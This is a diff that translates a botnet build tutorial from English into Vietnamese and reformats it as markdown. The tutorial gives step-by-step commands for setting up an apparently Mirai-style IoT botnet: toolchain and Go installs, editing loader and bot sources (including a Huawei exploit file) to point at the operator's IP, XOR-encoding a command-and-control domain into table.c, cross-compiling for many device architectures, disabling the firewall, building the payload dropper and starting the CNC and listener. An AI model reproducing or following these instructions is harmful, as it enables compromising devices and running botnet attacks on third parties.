@@ -1,15 +1,17 @@
-TUT made by zxcr9999
+TUT của zxcr9999
 
-// Copy and paste all to ur shit vps
-
+### Sao chép và dán tất cả vào shit vps của bạn
+```
 yum update -y
 yum install epel-release -y
 yum groupinstall "Development Tools" -y
 yum install gmp-devel -y
 ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
 yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y
+```
 
-
+### cài đặt golang
+```
 cd /tmp
 wget https://dl.google.com/go/go1.13.linux-amd64.tar.gz
 sha256sum go1.13.linux-amd64.tar.gz
@@ -23,28 +25,38 @@ source ~/.bash_profile
 go version
 go env
 cd ~/
+```
 
-// change ip
+### thay đổi ip
+```
 loader/src/main.c
 loader/src/headers/config.h
 dlr/main.c
 bot/huawei.c
 bot/util.c
+```
 
-// added domain
-drag file enc.c to ur vps and type command
+### thêm tên miền
+
+kéo tệp `enc.c` vào vps của bạn và gõ lệnh
+```
 gcc enc.c -o enc -std=c99
+```
+```
 ./enc string botnet.yourdomain.com
-and add TABLE_CNC_DOMAIN in table.c file
-"botnet.yourdomain.com" is your domain, and it is connected to the IP to host the botnet
+```
+và thêm `TABLE_CNC_DOMAIN` vào trong tệp `table.c`
 
-add_entry(TABLE_CNC_DOMAIN, "\xa2\xaf\xa2\xef\xb3\xa0\xbb\xaf\xa4\xb5\xf3\xf1\xf3\xf0\xef\xac\xad", 17);
+`botnet.yourdomain.com` là tên miền của bạn và nó được kết nối với IP để lưu trữ botnet
 
-number 17 will correspond to xor bytes
+`add_entry(TABLE_CNC_DOMAIN, "\xa2\xaf\xa2\xef\xb3\xa0\xbb\xaf\xa4\xb5\xf3\xf1\xf3\xf0\xef\xac\xad", 17);`
 
+số 17 sẽ tương ứng với byte xor
+```
 mkdir /etc/xcompile
 cd /etc/xcompile
-
+```
+```
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
@@ -57,7 +69,8 @@ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.ta
 wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
 wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2
-
+```
+```
 tar -jxf cross-compiler-i586.tar.bz2
 tar -jxf cross-compiler-m68k.tar.bz2
 tar -jxf cross-compiler-mips.tar.bz2
@@ -70,7 +83,11 @@ tar -jxf cross-compiler-armv5l.tar.bz2
 tar -jxf cross-compiler-armv6l.tar.bz2
 tar -jxf cross-compiler-armv7l.tar.bz2
 tar -jxf cross-compiler-x86_64.tar.bz2
+```
+```
 rm -rf *.tar.*
+```
+```
 mv cross-compiler-i586 i586
 mv cross-compiler-m68k m68k
 mv cross-compiler-mips mips
@@ -83,36 +100,41 @@ mv cross-compiler-armv5l armv5l
 mv cross-compiler-armv6l armv6l
 mv cross-compiler-armv7l armv7l
 mv cross-compiler-x86_64 x86_64
+```
 
-
-// Start building
-
+### Bắt đầu xây dựng
+```
 service firewalld stop
 service iptables stop 
 service httpd restart  
 service mariadb stop
-
+```
+```
 cd cnc/
 sh build.sh
-
+```
+```
 cd ~/
 chmod 777 *
 sh build.sh
-
+```
+```
 nano /usr/include/bits/typesizes.h
-scroll down and edit the 1024 to 999999
-THEN SAVE IT 
-ulimit -n999999; ulimit -u999999; ulimit -e999999
+```
+cuộn xuống và chỉnh sửa 1024 thành 999999
 
-// Build .sh file
+SAU ĐÓ LƯU
+```
+ulimit -n999999; ulimit -u999999; ulimit -e999999
+```
+### Xây dựng file `.sh`
 python payload.py
 
-
-// How to start cnc and listen
-
+### Cách khởi động cnc và listen
+```
 cd cnc/
 screen ./cnc 56999 1337 10
 screen ./listen
+```
 
-
-Help: 56999 is bot port (if you want to replace it go to bot/main.c file line 429), 1337 is cnc port, 10 is thread (max threads is 750)
+Help: 56999 là cổng bot (nếu muốn thay thì vào file `bot/main.c` dòng 429), 1337 là cổng cnc, 10 là luồng (tối đa luồng là 750)
